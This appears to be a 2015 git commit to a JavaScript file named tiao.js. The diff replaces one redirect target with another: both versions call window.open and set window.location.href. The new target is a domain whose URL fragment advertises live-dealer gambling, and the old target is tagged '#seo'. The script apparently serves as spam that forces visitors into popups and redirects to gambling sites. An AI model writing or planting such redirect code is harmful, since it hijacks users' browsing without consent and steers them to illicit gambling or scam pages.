9c02f17bf3aa8ec5d1dedea312242bf0a8ef5d3c
sadasd12 <sadasd12@outlook.com>
2015-12-07 21:38:03 +0800

    Update tiao.js

--- hm77z/tiao.js
+++ hm77z/tiao.js
@@ -1,3 +1,2 @@
- window.open ("http://25474.com/#seo"); 
- 
- window.location.href="http://25474.com/#seo"; 
+window.open ("http://556.io/#真人博彩进入8889.io"); 
+window.location.href="http://556.io/#真人博彩进入8889.io"; 
